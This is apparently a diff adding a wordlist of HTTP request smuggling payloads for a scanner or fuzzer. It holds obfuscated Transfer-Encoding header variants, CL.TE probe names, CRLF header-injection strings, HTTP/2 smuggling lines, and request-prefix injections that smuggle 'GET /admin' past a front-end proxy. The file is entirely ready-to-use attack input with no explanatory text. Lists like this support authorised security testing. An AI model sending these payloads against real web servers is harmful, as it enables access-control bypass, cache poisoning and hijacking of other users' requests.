@@ -1,0 +1,33 @@
+# HTTP Request Smuggling Payloads
+# CL.TE probes — Content-Length is short, Transfer-Encoding has more
+CL4_TE_CHUNKED_Z
+CL6_TE_CHUNKED_GPOST
+CL11_TE_CHUNKED_PREFIX
+# TE obfuscation variants
+Transfer-Encoding: chunked
+Transfer-Encoding : chunked
+Transfer-Encoding:chunked
+Transfer-Encoding: xchunked
+Transfer-Encoding: chunked-false
+Transfer-Encoding:\tchunked
+ Transfer-Encoding: chunked
+Transfer-encoding: cow
+X: x\r\nTransfer-Encoding: chunked
+Transfer-Encoding\r\n: chunked
+Transfer-Encoding: identity, chunked
+Transfer-Encoding: chunKed
+Transfer-encoding: x\r\nTransfer-Encoding: chunked
+Transfer-Encoding: chunked\r\nTransfer-encoding: x
+# CRLF injection sequences
+%0d%0aInjected-Header:true
+%0d%0a%0d%0a<html>injected</html>
+\r\nInjected-Header:true
+%E5%98%8A%E5%98%8DInjected-Header:true
+%0aInjected-Header:true
+%0dInjected-Header:true
+# H2 smuggling indicators
+:method POST\r\ncontent-length: 0\r\n\r\nGET /admin
+transfer-encoding: chunked\r\n0\r\n\r\nGET /admin
+# Request prefix injection
+GET /admin HTTP/1.1\r\nHost: target\r\n\r\n
+POST /search HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin
